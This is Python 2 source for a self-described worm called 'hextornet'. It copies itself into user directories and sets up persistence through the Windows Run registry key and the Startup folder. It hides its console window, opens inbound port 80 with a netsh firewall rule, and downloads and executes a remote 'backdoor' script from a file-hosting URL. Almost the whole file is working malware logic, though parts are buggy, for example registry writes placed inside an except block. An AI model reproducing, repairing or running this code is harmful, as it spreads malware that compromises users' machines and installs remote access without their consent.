#!/usr/bin/env python

from shutil import copyfile
import os, getpass
import random, sys, pkg_resources
from urllib2 import urlopen
import subprocess
import shutil
from time import sleep

src1 = os.path.abspath(__file__)
src = os.path.abspath('hextornet.py')
usr = getpass.getuser()
URL = 'http://download1081.mediafire.com/baue0t5ua4mg/4v19d8b5jd2b7jj/hexServer.py'

hextornet   = ['winHex']#, Hxtprocess', 'HXTNet', 'HxWinProcess', 'NetWinHex']
directories = ['Documents']#, 'Downloads', 'Music', 'Pictures', 'Videos']
hexDir = zip(directories, hextornet)
localization = []
dst = ""


def windows_client(system = sys.platform):
        if system.startswith('win'):
	    import win32con
            import win32api
            import win32console
            import win32gui
            #from _winreg import *
            return True
        else:
            return False


def linux_client(system = sys.platform):
    if system.startswith('linux'):
        return True
    else:
        return False


def hide():
        window = win32console.GetConsoleWindow()
        win32gui.ShowWindow(window,0)
        return True


def addStartup():
	try:
		
                fp = os.path.dirname(os.path.realpath(__file__))
                file_name = sys.argv[0].split("\\")[-1]
                new_file_path = fp + "\\" + file_name
                keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
                key2change= OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)

	except:
		
                SetValueEx(key2change, "WinProcess", 0, REG_SZ, new_file_path)
                path = 'C:\\Users\\' +usr+"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
                os.system('copy hextornet.py path')
                #shutil.move(src, path)



def verification(source, worm, dst):
        code = dst + worm + '.py'
        if source != code or source == code:
                source = os.path.abspath(dst + worm)
                downloadBackDoor(URL, dst)
        else:
		print'[SOURCE != CODE]'
                pass
        
def validate():
        for d, w in hexDir:
                linux = '/' + usr + '/' + d + '/'
                windows = "C:/Users" + "/" + usr + "/" + d + "/"
                if linux_client():
                        verification(src1, w, linux)
                elif windows_client():
                        verification(src1, w, windows)
                else:
                        pass

def copyHex(hexworm, src, dst):
        copyfile(src, dst)
        print'[PROPAGATE]', dst
        hextornet.remove(hexworm)


def propagate():
        print"[===============Worm location==========]"
        for d, w in hexDir:
                if linux_client():
                        dst = '/' + usr + '/' + d + '/' + str(w) + '.py'
                elif windows_client():
                        dst = "C:/Users" + "/" + usr + "/" + d + "/" + str(w) + '.py'
                localization.append(dst)
                copyHex(w, src, dst)
        print"[======================================]"


def downloadBackDoor(url, path):
        print'\t[START DOWNLOAD]',src
        filename = url.split('/')[-1].split('#')[0].split('?')[0]
        content = urlopen(url).read()
        outfile = open(filename, "wb")
        outfile.write(content)
        outfile.close()
        source= os.path.join(path)
	print'[MOVE] ',source,'[TO] ',path
        shutil.move(source, path)
        print'\t[DOWNLOAD IN]',os.path.abspath(filename)
	print'\t[DOWNLOAD DONE]', filename
	print'\t[RUNNING]',os.path.abspath(filename)
        run(os.path.abspath(filename))


def runWorms():
        for worm in range(0, len(localization)):
		run(localization[worm])


def run(program):
        print'[RUN]',program
        try:
                process = subprocess.Popen("python "+str(program), shell=True)
		process.wait()
        except Exception as e:
                return '[NOT RUN!!]'+str(e)


def openPort():
        os.system('netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80')

def main():
        if windows_client():
		validate()
                addStartup()
                propagate()
		openPort()
		hide()
        elif linux_client():
		propagate()
		validate()


if __name__ == "__main__":
        main()
